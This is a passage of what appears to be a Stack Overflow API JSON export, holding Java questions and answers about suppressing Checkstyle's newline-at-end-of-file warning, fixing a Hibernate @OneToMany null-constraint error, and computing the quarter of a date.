&quot;http://www.puppycrawl.com/dtds/suppressions_1_1.dtd&quot;&gt;\r\n\r\n    &lt;suppressions&gt;\r\n        &lt;suppress checks=&quot;NewlineAtEndOfFile&quot; files=&quot;.java&quot; /&gt;\r\n    &lt;/suppressions&gt;\r\n","title":"How to get rid of Checkstyle message &#39;File does not end with a newline.&#39;","body":"\n\n<p>There's a simpler way to do this. You can specify a suppressions file without overriding the sun checkstyle config file:</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;plugin&gt;\n    &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n    &lt;artifactId&gt;maven-checkstyle-plugin&lt;/artifactId&gt;\n    &lt;configuration&gt;\n        &lt;suppressionsLocation&gt;suppressions.xml&lt;/suppressionsLocation&gt;\n        &lt;configLocation&gt;config/sun_checks.xml&lt;/configLocation&gt;\n    &lt;/configuration&gt;\n&lt;/plugin&gt;\n</code></pre>\n\n<p>Where your suppressions.xml is:</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE suppressions PUBLIC\n    \"-//Puppy Crawl//DTD Suppressions 1.1//EN\"\n    \"http://www.puppycrawl.com/dtds/suppressions_1_1.dtd\"&gt;\n\n&lt;suppressions&gt;\n    &lt;suppress checks=\"NewlineAtEndOfFile\" files=\".java\" /&gt;\n&lt;/suppressions&gt;\n</code></pre>\n"},{"tags":[],"owner":{"account_id":2489310,"reputation":1,"user_id":2167131,"display_name":"Raghu"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1363206184,"creation_date":1363204541,"answer_id":15395186,"question_id":997021,"body_markdown":"Eclipse `..Window &gt;&gt; Preferences &gt;&gt; Checkstyle &gt;&gt; Select the configuration file &gt;&gt;` \r\n\r\n 1. Click on `&quot;Properties&quot;` button &gt;&gt; Uncheck the `Protect Checkstyle Configuration file`.\r\n 2. Click on `&quot;Configure&quot;` button &gt;&gt; search for `&quot;New Line At End Of File&quot;` &gt;&gt; Uncheck the   checkbox which you see next to `New Line At End Of File`. ","title":"How to get rid of Checkstyle message &#39;File does not end with a newline.&#39;","body":"<p>Eclipse <code>..Window &gt;&gt; Preferences &gt;&gt; Checkstyle &gt;&gt; Select the configuration file &gt;&gt;</code> </p>\n\n<ol>\n<li>Click on <code>\"Properties\"</code> button >> Uncheck the <code>Protect Checkstyle Configuration file</code>.</li>\n<li>Click on <code>\"Configure\"</code> button >> search for <code>\"New Line At End Of File\"</code> >> Uncheck the   checkbox which you see next to <code>New Line At End Of File</code>. </li>\n</ol>\n"},{"tags":[],"owner":{"account_id":39562,"reputation":1106,"user_id":114188,"display_name":"Alexey Voinov"},"down_vote_count":0,"up_vote_count":65,"is_accepted":false,"score":65,"last_activity_date":1389180121,"creation_date":1363353641,"answer_id":15433548,"question_id":997021,"body_markdown":"In my case that was a problem with improper configuration of that checker. By default it uses system default convention of line endings. I was working on windows and the project was using unix-style line endings. I don&#39;t think ignoring the warning is the best strategy, so what I&#39;ve done is:\r\n\r\n&lt;!-- language: xml --&gt;\r\n\r\n    &lt;module name=&quot;Checker&quot;&gt;\r\n        &lt;module name=&quot;NewlineAtEndOfFile&quot;&gt;\r\n            &lt;property name=&quot;lineSeparator&quot; value=&quot;lf&quot; /&gt;\r\n        &lt;/module&gt;\r\n    &lt;/module&gt;\r\n","title":"How to get rid of Checkstyle message &#39;File does not end with a newline.&#39;","body":"<p>In my case that was a problem with improper configuration of that checker. By default it uses system default convention of line endings. I was working on windows and the project was using unix-style line endings. I don't think ignoring the warning is the best strategy, so what I've done is:</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;module name=\"Checker\"&gt;\n    &lt;module name=\"NewlineAtEndOfFile\"&gt;\n        &lt;property name=\"lineSeparator\" value=\"lf\" /&gt;\n    &lt;/module&gt;\n&lt;/module&gt;\n</code></pre>\n"},{"tags":[],"owner":{"account_id":8986,"reputation":2791,"user_id":16424,"accept_rate":92,"display_name":"Ben"},"down_vote_count":0,"up_vote_count":8,"is_accepted":false,"score":8,"last_activity_date":1366644775,"creation_date":1366644775,"answer_id":16150967,"question_id":997021,"body_markdown":"I run into this problem when files are saved as UNIX format instead of DOS. (or other way around if you do your work in Unix)\r\n\r\nTo fix it, I use a program do convert from UNIX format to DOS and save the file in that format.\r\n\r\nIn eclipse:\r\nFile -&gt; Convert Line Delimiters To -&gt; Windows\r\n\r\n\r\n","title":"How to get rid of Checkstyle message &#39;File does not end with a newline.&#39;","body":"<p>I run into this problem when files are saved as UNIX format instead of DOS. (or other way around if you do your work in Unix)</p>\n\n<p>To fix it, I use a program do convert from UNIX format to DOS and save the file in that format.</p>\n\n<p>In eclipse:\nFile -> Convert Line Delimiters To -> Windows</p>\n"},{"tags":[],"owner":{"account_id":7289613,"reputation":1,"user_id":5556536,"display_name":"Heiko Mueller"},"down_vote_count":3,"up_vote_count":0,"is_accepted":false,"score":-3,"last_activity_date":1447363472,"creation_date":1447363472,"answer_id":33681659,"question_id":997021,"body_markdown":"//Here is the brute force solution:\r\n\r\n    import java.io.BufferedReader;\r\n    import java.io.File;\r\n    import java.io.FileReader;\r\n    import java.io.FileWriter;\r\n    import java.util.ArrayList;\r\n\r\n    /**\r\n     *\r\n     * @author hMueller\r\n     */\r\n\r\n    public class UnixToWindowsEncoding {\r\n    \r\n    //rewrites all .java files in Windows encoding\r\n    //a[0] = parent directory\r\n    //loops through all subdirectories and fixes whatever .java file it finds\r\n    public static void main(String[] a){\r\n        String startdir = a[0];\r\n        fixDir(startdir);\r\n        \r\n    }\r\n    \r\n    private static void fixDir(String dirname){\r\n        try{\r\n            File f = new File(dirname);\r\n            File[] list = f.listFiles();\r\n            for(int i = 0; i &lt; list.length; i++){\r\n                if(list[i].isDirectory()){\r\n                    fixDir(list[i].getAbsolutePath());\r\n                }else{\r\n                    if(list[i].getName().endsWith(&quot;.java&quot;)){\r\n                        ArrayList&lt;String&gt; l = new ArrayList&lt;String&gt;();\r\n                        FileReader fr = new FileReader(list[i]);\r\n                        BufferedReader br = new BufferedReader(fr);\r\n                        String line = &quot;&quot;;\r\n                        while( (line = br.readLine()) != null){\r\n                            l.add(line);\r\n                        }\r\n                        br.close();\r\n                        fr.close();\r\n                        list[i].delete();\r\n                        FileWriter fwr = new FileWriter(list[i]);\r\n                        for(String s : l){\r\n                            fwr.write(s + &quot;\\r\\n&quot;);\r\n                        }\r\n                        fwr.flush();\r\n                        fwr.close();\r\n                    }\r\n                }\r\n            }\r\n        }catch(Exception ioe){\r\n            ioe.printStackTrace();\r\n        }\r\n    }\r\n    \r\n    }","title":"How to get rid of Checkstyle message &#39;File does not end with a newline.&#39;","body":"<p>//Here is the brute force solution:</p>\n\n<pre><code>import java.io.BufferedReader;\nimport java.io.File;\nimport java.io.FileReader;\nimport java.io.FileWriter;\nimport java.util.ArrayList;\n\n/**\n *\n * @author hMueller\n */\n\npublic class UnixToWindowsEncoding {\n\n//rewrites all .java files in Windows encoding\n//a[0] = parent directory\n//loops through all subdirectories and fixes whatever .java file it finds\npublic static void main(String[] a){\n    String startdir = a[0];\n    fixDir(startdir);\n\n}\n\nprivate static void fixDir(String dirname){\n    try{\n        File f = new File(dirname);\n        File[] list = f.listFiles();\n        for(int i = 0; i &lt; list.length; i++){\n            if(list[i].isDirectory()){\n                fixDir(list[i].getAbsolutePath());\n            }else{\n                if(list[i].getName().endsWith(\".java\")){\n                    ArrayList&lt;String&gt; l = new ArrayList&lt;String&gt;();\n                    FileReader fr = new FileReader(list[i]);\n                    BufferedReader br = new BufferedReader(fr);\n                    String line = \"\";\n                    while( (line = br.readLine()) != null){\n                        l.add(line);\n                    }\n                    br.close();\n                    fr.close();\n                    list[i].delete();\n                    FileWriter fwr = new FileWriter(list[i]);\n                    for(String s : l){\n                        fwr.write(s + \"\\r\\n\");\n                    }\n                    fwr.flush();\n                    fwr.close();\n                }\n            }\n        }\n    }catch(Exception ioe){\n        ioe.printStackTrace();\n    }\n}\n\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":11968064,"reputation":31,"user_id":8757189,"display_name":"garima kumar"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1649758612,"creation_date":1649758612,"answer_id":71840896,"question_id":997021,"body_markdown":"Add a new line(press enter) at the end of the class where the issue is observed","title":"How to get rid of Checkstyle message &#39;File does not end with a newline.&#39;","body":"<p>Add a new line(press enter) at the end of the class where the issue is observed</p>\n"},{"tags":[],"owner":{"account_id":3580846,"reputation":194,"user_id":2989105,"display_name":"David Chaava"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683725246,"creation_date":1683725246,"answer_id":76219025,"question_id":997021,"body_markdown":"The most effective way would be to change the line separator on your side.\r\nThe problem looks like you have a CRLF line separator, but checkstyle expects macOS Unix style\\n\r\nFor example, for Intellij Idea you can use this [guide][1] \r\n\r\n\r\n  [1]: https://www.jetbrains.com/help/idea/configuring-line-endings-and-line-separators.html#:~:text=From%20the%20main%20menu%2C%20select%20File%20%7C%20File%20Properties%20%7C%20Line,ending%20style%20from%20the%20list.","title":"How to get rid of Checkstyle message &#39;File does not end with a newline.&#39;","body":"<p>The most effective way would be to change the line separator on your side.\nThe problem looks like you have a CRLF line separator, but checkstyle expects macOS Unix style\\n\nFor example, for Intellij Idea you can use this <a href=\"https://www.jetbrains.com/help/idea/configuring-line-endings-and-line-separators.html#:%7E:text=From%20the%20main%20menu%2C%20select%20File%20%7C%20File%20Properties%20%7C%20Line,ending%20style%20from%20the%20list.\" rel=\"nofollow noreferrer\">guide</a></p>\n"}],"owner":{"account_id":24465,"reputation":6590,"user_id":62201,"accept_rate":50,"display_name":"Michael Pralow"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":58231,"favorite_count":0,"down_vote_count":0,"up_vote_count":34,"accepted_answer_id":1015010,"answer_count":8,"score":34,"last_activity_date":1683725246,"creation_date":1245082875,"question_id":997021,"body_markdown":"I&#39;m working with a Maven (jar) Project in Netbeans (Windows), which creates Checkstyle reports with the Maven Checkstyle plugin.\r\n\r\nNo matter what I do, I always get the message: `File does not end with a newline` for Java class files.\r\n\r\nWhat can I do/configure in either Netbeans or Checkstyle to get rid of the message ?\r\n\r\nVersions of used software:\r\n\r\n - WinXP SP3\r\n - Netbeans 6.7 RC1 (happens with 6.5 too)\r\n - Maven 2.0.9\r\n - Maven Checkstyle Plugin 2.2\r\n - Java 1.6 (Update 14)","title":"How to get rid of Checkstyle message &#39;File does not end with a newline.&#39;","body":"<p>I'm working with a Maven (jar) Project in Netbeans (Windows), which creates Checkstyle reports with the Maven Checkstyle plugin.</p>\n\n<p>No matter what I do, I always get the message: <code>File does not end with a newline</code> for Java class files.</p>\n\n<p>What can I do/configure in either Netbeans or Checkstyle to get rid of the message ?</p>\n\n<p>Versions of used software:</p>\n\n<ul>\n<li>WinXP SP3</li>\n<li>Netbeans 6.7 RC1 (happens with 6.5 too)</li>\n<li>Maven 2.0.9</li>\n<li>Maven Checkstyle Plugin 2.2</li>\n<li>Java 1.6 (Update 14)</li>\n</ul>\n"},{"tags":["java","hibernate","jpa","spring-data","one-to-many"],"comments":[{"owner":{"account_id":8708088,"reputation":65,"user_id":6515307,"display_name":"Lesrac"},"score":0,"creation_date":1662642232,"post_id":73649241,"comment_id":130056463,"body_markdown":"Have a look at this, most probably related, question: https://stackoverflow.com/questions/3927091/save-child-objects-automatically-using-jpa-hibernate","body":"Have a look at this, most probably related, question: <a href=\"https://stackoverflow.com/questions/3927091/save-child-objects-automatically-using-jpa-hibernate\" title=\"save child objects automatically using jpa hibernate\">stackoverflow.com/questions/3927091/&hellip;</a>"}],"answers":[{"tags":[],"owner":{"account_id":5157043,"reputation":1369,"user_id":4130003,"display_name":"johnnyutts"},"down_vote_count":1,"up_vote_count":1,"is_accepted":false,"score":0,"last_activity_date":1662642255,"creation_date":1662642255,"answer_id":73649545,"question_id":73649241,"body_markdown":"You are cascading persistence from the parent to the child, but the child has no parent. As well as adding a child to the parent make sure you also set the parent on the child. It&#39;s important to keep them in sync when declaring bidirectional relationships\r\n```\r\nchild.setParent(parent);\r\n```","title":"Hibernate @OneToMany: PSQLException: ERROR: null value in column","body":"<p>You are cascading persistence from the parent to the child, but the child has no parent. As well as adding a child to the parent make sure you also set the parent on the child. It's important to keep them in sync when declaring bidirectional relationships</p>\n<pre><code>child.setParent(parent);\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1177444,"reputation":491,"user_id":1153088,"accept_rate":67,"display_name":"Yashari"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683725235,"creation_date":1683725235,"answer_id":76219023,"question_id":73649241,"body_markdown":"This is an old question, but for new people wondering, the answer by [@johnnynutts][1] is actually correct. There are multiple ways to implement a `@OneToMany` relationship in hibernate. As described in detail by [a post from Vlad Mihalcea][2], these ways are:\r\n - Unidirectional @OneToMany\r\n - Unidirectional @OneToMany with @JoinColumn\r\n - Bidirectional @OneToMany (which is the one used in the question&#39;s example)\r\n\r\nIf you decide to implement the `Bidirectional` method, then you need keep both connection in sync (update both parent &amp; child) or else you&#39;ll get the error on saving.\r\n\r\n\r\n  [1]: https://stackoverflow.com/a/73649545/1153088\r\n  [2]: https://vladmihalcea.com/the-best-way-to-map-a-onetomany-association-with-jpa-and-hibernate/","title":"Hibernate @OneToMany: PSQLException: ERROR: null value in column","body":"<p>This is an old question, but for new people wondering, the answer by <a href=\"https://stackoverflow.com/a/73649545/1153088\">@johnnynutts</a> is actually correct. There are multiple ways to implement a <code>@OneToMany</code> relationship in hibernate. As described in detail by <a href=\"https://vladmihalcea.com/the-best-way-to-map-a-onetomany-association-with-jpa-and-hibernate/\" rel=\"nofollow noreferrer\">a post from Vlad Mihalcea</a>, these ways are:</p>\n<ul>\n<li>Unidirectional @OneToMany</li>\n<li>Unidirectional @OneToMany with @JoinColumn</li>\n<li>Bidirectional @OneToMany (which is the one used in the question's example)</li>\n</ul>\n<p>If you decide to implement the <code>Bidirectional</code> method, then you need keep both connection in sync (update both parent &amp; child) or else you'll get the error on saving.</p>\n"}],"owner":{"account_id":14251843,"reputation":269,"user_id":10295271,"display_name":"annswerg"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":667,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":2,"score":1,"last_activity_date":1683725235,"creation_date":1662640712,"question_id":73649241,"body_markdown":"I have two dtos and corresponding dao interfaces which extend JpaRepository \r\n\r\n    @Entity\r\n    @Table(name = &quot;parent&quot;)\r\n    @NoArgsConstructor\r\n    @AllArgsConstructor\r\n    @SequenceGenerator(name = &quot;parentSequence&quot;, sequenceName = &quot;parent_id_seq&quot;,\r\n            allocationSize = 1)\r\n    public class ParentDto implements Serializable {\r\n        @Id\r\n        @GeneratedValue(strategy = GenerationType.SEQUENCE, generator = &quot;parentSequence&quot;)\r\n        private Long id;\r\n        \r\n        private String name;\r\n    \r\n        @OneToMany(mappedBy = &quot;parent&quot;, targetEntity = Child.class, cascade = CascadeType.ALL, fetch = FetchType.EAGER)\r\n        private List&lt;ChildDto&gt; children;\r\n    }\r\n    \r\n    \r\n    @Entity\r\n    @AllArgsConstructor\r\n    @SequenceGenerator(name=&quot;childSequence&quot;, sequenceName = &quot;child_id_seq&quot;, allocationSize=1)\r\n    @Table(name = &quot;child&quot;)\r\n    public class ChildDto {\r\n        @Id\r\n        @GeneratedValue(strategy = GenerationType.SEQUENCE, generator = &quot;childSequence&quot;)\r\n        private Long id;\r\n    \r\n        private String name;\r\n    \r\n        @ManyToOne\r\n        @JoinColumn(name = &quot;parent_id&quot;, nullable = false)\r\n        private ParentDto parent;\r\n    }\r\n\r\n    public interface ParentDao extends JpaRepository&lt;ParentDto, Long&gt; {\r\n    }\r\n    public interface ChildDao extends JpaRepository&lt;ChildDto, Long&gt; {\r\n    }\r\n\r\nI have the next request to save mapped to property `request` (ids should be generated by DB)\r\n\r\n&gt; {\r\n&gt;     &quot;parent&quot;: {\r\n&gt;        &quot;name&quot;: &quot;Bob&quot;,\r\n&gt;        &quot;children&quot;: [{\r\n&gt;             &quot;name&quot;: &quot;Bob2&quot;\r\n&gt;        }]\r\n&gt;     } }\r\n\r\nExecuting `parentDao.save(request);` and getting exception \r\n\r\n&gt; Caused by: java.sql.BatchUpdateException: Batch entry 0 insert into\r\n&gt; child (id, name, parent_id) values (1, &quot;Bob2&quot;, NULL) was aborted:\r\n&gt; ERROR: null value in column &quot;parent_id&quot; violates not-null constraint  \r\n&gt; Detail: Failing row contains (1, &quot;Bob2&quot;, NULL).  Call getNextException\r\n&gt; to see other errors in the batch. Caused by:\r\n&gt; org.postgresql.util.PSQLException: ERROR: null value in column\r\n&gt; &quot;parent_id&quot; violates not-null constraint   Detail: Failing row\r\n&gt; contains (1, &quot;Bob2&quot;, NULL).","title":"Hibernate @OneToMany: PSQLException: ERROR: null value in column","body":"<p>I have two dtos and corresponding dao interfaces which extend JpaRepository</p>\n<pre><code>@Entity\n@Table(name = &quot;parent&quot;)\n@NoArgsConstructor\n@AllArgsConstructor\n@SequenceGenerator(name = &quot;parentSequence&quot;, sequenceName = &quot;parent_id_seq&quot;,\n        allocationSize = 1)\npublic class ParentDto implements Serializable {\n    @Id\n    @GeneratedValue(strategy = GenerationType.SEQUENCE, generator = &quot;parentSequence&quot;)\n    private Long id;\n    \n    private String name;\n\n    @OneToMany(mappedBy = &quot;parent&quot;, targetEntity = Child.class, cascade = CascadeType.ALL, fetch = FetchType.EAGER)\n    private List&lt;ChildDto&gt; children;\n}\n\n\n@Entity\n@AllArgsConstructor\n@SequenceGenerator(name=&quot;childSequence&quot;, sequenceName = &quot;child_id_seq&quot;, allocationSize=1)\n@Table(name = &quot;child&quot;)\npublic class ChildDto {\n    @Id\n    @GeneratedValue(strategy = GenerationType.SEQUENCE, generator = &quot;childSequence&quot;)\n    private Long id;\n\n    private String name;\n\n    @ManyToOne\n    @JoinColumn(name = &quot;parent_id&quot;, nullable = false)\n    private ParentDto parent;\n}\n\npublic interface ParentDao extends JpaRepository&lt;ParentDto, Long&gt; {\n}\npublic interface ChildDao extends JpaRepository&lt;ChildDto, Long&gt; {\n}\n</code></pre>\n<p>I have the next request to save mapped to property <code>request</code> (ids should be generated by DB)</p>\n<blockquote>\n<p>{\n&quot;parent&quot;: {\n&quot;name&quot;: &quot;Bob&quot;,\n&quot;children&quot;: [{\n&quot;name&quot;: &quot;Bob2&quot;\n}]\n} }</p>\n</blockquote>\n<p>Executing <code>parentDao.save(request);</code> and getting exception</p>\n<blockquote>\n<p>Caused by: java.sql.BatchUpdateException: Batch entry 0 insert into\nchild (id, name, parent_id) values (1, &quot;Bob2&quot;, NULL) was aborted:\nERROR: null value in column &quot;parent_id&quot; violates not-null constraint<br />\nDetail: Failing row contains (1, &quot;Bob2&quot;, NULL).  Call getNextException\nto see other errors in the batch. Caused by:\norg.postgresql.util.PSQLException: ERROR: null value in column\n&quot;parent_id&quot; violates not-null constraint   Detail: Failing row\ncontains (1, &quot;Bob2&quot;, NULL).</p>\n</blockquote>\n"},{"tags":["java","calendar"],"answers":[{"tags":[],"owner":{"account_id":970,"reputation":399857,"user_id":1288,"accept_rate":93,"display_name":"Bill the Lizard"},"down_vote_count":3,"up_vote_count":73,"is_accepted":true,"score":70,"last_activity_date":1683725036,"creation_date":1227115123,"answer_id":302669,"question_id":302658,"body_markdown":"Since Java 8, the quarter is accessible as a field using classes in the [java.time][1] package.\r\n\r\n    import java.time.LocalDate;\r\n    import java.time.temporal.IsoFields;\r\n\r\n    LocalDate myLocal = LocalDate.now();\r\n    int quarter = myLocal.get(IsoFields.QUARTER_OF_YEAR);\r\n\r\n---\r\n\r\nIn older versions of Java, you could use:\r\n\r\n    import java.util.Date;\r\n\r\n    Date myDate = new Date();\r\n    int quarter = (myDate.getMonth() / 3) + 1;\r\n\r\nBe warned, though that [getMonth][2] was deprecated early on:\r\n\r\n&gt; As of JDK version 1.1, replaced by Calendar.get(Calendar.MONTH).\r\n\r\nInstead you could use a `Calendar` object like this:\r\n\r\n    import java.util.Calendar;\r\n    import java.util.GregorianCalendar;\r\n\r\n    Calendar myCal = new GregorianCalendar();\r\n    int quarter = (myCal.get(Calendar.MONTH) / 3) + 1;\r\n\r\n\r\n  [1]: https://docs.oracle.com/javase/8/docs/api/java/time/package-summary.html\r\n  [2]: https://docs.oracle.com/javase/7/docs/api/java/util/Date.html#getMonth()","title":"How do I discover the Quarter of a given Date?","body":"<p>Since Java 8, the quarter is accessible as a field using classes in the <a href=\"https://docs.oracle.com/javase/8/docs/api/java/time/package-summary.html\" rel=\"nofollow noreferrer\">java.time</a> package.</p>\n<pre><code>import java.time.LocalDate;\nimport java.time.temporal.IsoFields;\n\nLocalDate myLocal = LocalDate.now();\nint quarter = myLocal.get(IsoFields.QUARTER_OF_YEAR);\n</code></pre>\n<hr />\n<p>In older versions of Java, you could use:</p>\n<pre><code>import java.util.Date;\n\nDate myDate = new Date();\nint quarter = (myDate.getMonth() / 3) + 1;\n</code></pre>\n<p>Be warned, though that <a href=\"https://docs.oracle.com/javase/7/docs/api/java/util/Date.html#getMonth()\" rel=\"nofollow noreferrer\">getMonth</a> was deprecated early on:</p>\n<blockquote>\n<p>As of JDK version 1.1, replaced by Calendar.get(Calendar.MONTH).</p>\n</blockquote>\n<p>Instead you could use a <code>Calendar</code> object like this:</p>\n<pre><code>import java.util.Calendar;\nimport java.util.GregorianCalendar;\n\nCalendar myCal = new GregorianCalendar();\nint quarter = (myCal.get(Calendar.MONTH) / 3) + 1;\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1108,"reputation":9901,"user_id":1471,"accept_rate":64,"display_name":"Tim Frey"},"down_vote_count":3,"up_vote_count":17,"is_accepted":false,"score":14,"last_activity_date":1227115206,"creation_date":1227115206,"answer_id":302674,"question_id":302658,"body_markdown":"You are going to have to write your own code because the term &quot;Quarter&quot; is different for each business.  Can&#39;t you just do something like:\r\n\r\n    Calendar c = /* get from somewhere */\r\n    int month = c.get(Calendar.MONTH);\r\n\r\n    return (month &gt;= Calendar.JANUARY &amp;&amp; month &lt;= Calendar.MARCH)     ? &quot;Q1&quot; :\r\n           (month &gt;= Calendar.APRIL &amp;&amp; month &lt;= Calendar.JUNE)        ? &quot;Q2&quot; :\r\n           (month &gt;= Calendar.JULY &amp;&amp; month &lt;= Calendar.SEPTEMBER)    ? &quot;Q3&quot; :\r\n                                                                        &quot;Q4&quot;;","title":"How do I discover the Quarter of a given Date?","body":"<p>You are going to have to write your own code because the term \"Quarter\" is different for each business.  Can't you just do something like:</p>\n\n<pre><code>Calendar c = /* get from somewhere */\nint month = c.get(Calendar.MONTH);\n\nreturn (month &gt;= Calendar.JANUARY &amp;&amp; month &lt;= Calendar.MARCH)     ? \"Q1\" :\n       (month &gt;= Calendar.APRIL &amp;&amp; month &lt;= Calendar.JUNE)        ? \"Q2\" :\n       (month &gt;= Calendar.JULY &amp;&amp; month &lt;= Calendar.SEPTEMBER)    ? \"Q3\" :\n                                                                    \"Q4\";\n</code></pre>\n"},{"tags":[],"owner":{"account_id":2496,"reputation":266234,"user_id":3474,"accept_rate":83,"display_name":"erickson"},"down_vote_count":0,"up_vote_count":10,"is_accepted":false,"score":10,"last_activity_date":1227116819,"creation_date":1227115401,"answer_id":302688,"question_id":302658,"body_markdown":"Since quarters are a localized (Western) concept, specify a Locale rather than using the platform default:\r\n\r\n    Calendar cal = Calendar.getInstance(Locale.US);\r\n    /* Consider whether you need to set the calendar&#39;s timezone. */\r\n    cal.setTime(date);\r\n    int month = cal.get(Calendar.MONTH); /* 0 through 11 */\r\n    int quarter = (month / 3) + 1;\r\n\r\nThis will avoid getting the thirteenth month (Calendar.UNDECIMBER) on non-Western calendars, and any skew caused by their shorter months.","title":"How do I discover the Quarter of a given Date?","body":"<p>Since quarters are a localized (Western) concept, specify a Locale rather than using the platform default:</p>\n\n<pre><code>Calendar cal = Calendar.getInstance(Locale.US);\n/* Consider whether you need to set the calendar's timezone. */\ncal.setTime(date);\nint month = cal.get(Calendar.MONTH); /* 0 through 11 */\nint quarter = (month / 3) + 1;\n</code></pre>\n\n<p>This will avoid getting the thirteenth month (Calendar.UNDECIMBER) on non-Western calendars, and any skew caused by their shorter months.</p>\n"},{"tags":[],"owner":{"account_id":3958,"reputation":4898,"user_id":5814,"display_name":"Brendan Cashman"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1227115826,"creation_date":1227115826,"answer_id":302716,"question_id":302658,"body_markdown":"JFreeChart has a Quarter class. If you&#39;re curious, check out the [javadoc][1]. The source  is also available from [SourceForge][2] if you want to check out the implementation.\r\n\r\n\r\n  [1]: http://www.jfree.org/jfreechart/api/javadoc/index.html?org/jfree/data/time/Quarter.html\r\n  [2]: http://sourceforge.net/project/showfiles.php?group_id=15494&amp;package_id=12428","title":"How do I discover the Quarter of a given Date?","body":"<p>JFreeChart has a Quarter class. If you're curious, check out the <a href=\"http://www.jfree.org/jfreechart/api/javadoc/index.html?org/jfree/data/time/Quarter.html\" rel=\"nofollow noreferrer\">javadoc</a>. The source  is also available from <a href=\"http://sourceforge.net/project/showfiles.php?group_id=15494&amp;package_id=12428\" rel=\"nofollow noreferrer\">SourceForge</a> if you want to check out the implementation.</p>\n"},{"tags":[],"owner":{"account_id":7445,"reputation":62274,"user_id":12943,"accept_rate":84,"display_name":"Bill K"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1227117969,"creation_date":1227117969,"answer_id":302813,"question_id":302658,"body_markdown":"Good solutions here, but remember that quarters can be subject to change depending on company/industry too.  Sometimes a quarter can be a different 3 months.\r\n\r\nYou probably want to extend or encapsulate the calendar class to customize it to your tasks rather than write some utility function that converts it.  Your application is probably complex enough in that area that you will find other uses for your new calendar class--I promise you&#39;ll be glad you extended or encapsulated it even if it seems silly now.\r\n\r\n\r\n","title":"How do I discover the Quarter of a given Date?","body":"<p>Good solutions here, but remember that quarters can be subject to change depending on company/industry too.  Sometimes a quarter can be a different 3 months.</p>\n\n<p>You probably want to extend or encapsulate the calendar class to customize it to your tasks rather than write some utility function that converts it.  Your application is probably complex enough in that area that you will find other uses for your new calendar class--I promise you'll be glad you extended or encapsulated it even if it seems silly now.</p>\n"},{"tags":[],"owner":{"account_id":148236,"reputation":93535,"user_id":359862,"accept_rate":95,"display_name":"James Raitsev"},"down_vote_count":0,"up_vote_count":5,"is_accepted":false,"score":5,"last_activity_date":1372207391,"creation_date":1372207391,"answer_id":17309819,"question_id":302658,"body_markdown":"If you have\r\n\r\n    private static final int[] quarters = {1, 1, 1, 2, 2, 2, 3, 3, 3, 4, 4, 4};\r\n\r\nThen current `quarter` is\r\n\r\n    private static final int thisQuarter = quarters[thisMonth];\r\n\r\nWhere `thisMonth` is\r\n\r\n    private static final int thisMonth = cal.get(Calendar.MONTH);\r\n\r\n","title":"How do I discover the Quarter of a given Date?","body":"<p>If you have</p>\n\n<pre><code>private static final int[] quarters = {1, 1, 1, 2, 2, 2, 3, 3, 3, 4, 4, 4};\n</code></pre>\n\n<p>Then current <code>quarter</code> is</p>\n\n<pre><code>private static final int thisQuarter = quarters[thisMonth];\n</code></pre>\n\n<p>Where <code>thisMonth</code> is</p>\n\n<pre><code>private static final int thisMonth = cal.get(Calendar.MONTH);\n</code></pre>\n"},{"tags":[],"owner":{"account_id":4736637,"reputation":61,"user_id":3830848,"display_name":"user3830848"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1405110805,"creation_date":1405109466,"answer_id":24705756,"question_id":302658,"body_markdown":"    int month = Calendar.getInstance().get( Calendar.MONTH ) + 1;\r\n\r\n    int quarter = month % 3 == 0?  (month / 3): ( month / 3)+1;","title":"How do I discover the Quarter of a given Date?","body":"<pre><code>int month = Calendar.getInstance().get( Calendar.MONTH ) + 1;\n\nint quarter = month % 3 == 0?  (month / 3): ( month / 3)+1;\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1888683,"reputation":2445,"user_id":1707348,"display_name":"Marco"},"down_vote_count":1,"up_vote_count":2,"is_accepted":false,"score":1,"last_activity_date":1429898652,"creation_date":1429897631,"answer_id":29854193,"question_id":302658,"body_markdown":"Make sure that the `thisMonth` is at least a float or a double, not an int:\r\n\r\n    String quarter = thisMonth/3 &lt;= 1 ? &quot;Q1&quot; : thisMonth/3 &lt;= 2 ? &quot;Q2&quot; : thisMonth/3 &lt;= 3 ? &quot;Q3&quot; : &quot;Q4&quot;;\r\n\r\nRegards,\r\nMS","title":"How do I discover the Quarter of a given Date?","body":"<p>Make sure that the <code>thisMonth</code> is at least a float or a double, not an int:</p>\n\n<pre><code>String quarter = thisMonth/3 &lt;= 1 ? \"Q1\" : thisMonth/3 &lt;= 2 ? \"Q2\" : thisMonth/3 &lt;= 3 ? \"Q3\" : \"Q4\";\n</code></pre>\n\n<p>Regards,\nMS</p>\n"},{"tags":[],"owner":{"account_id":895233,"reputation":318,"user_id":932676,"display_name":"Karl John Hernandez"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1447333741,"creation_date":1447333741,"answer_id":33672171,"question_id":302658,"body_markdown":"For Me, I Used this method for string representation:\r\n\r\n    int quarter = (Calendar.getInstance().get(Calendar.MONTH) / 3); // 0 to 3\r\n    String[] mQuarterKey = {&quot;qt1&quot;, &quot;qt2&quot;, &quot;qt3&quot;, &quot;qt4&quot;};\r\n    String strQuarter = mQuarterKey[quarter];","title":"How do I discover the Quarter of a given Date?","body":"<p>For Me, I 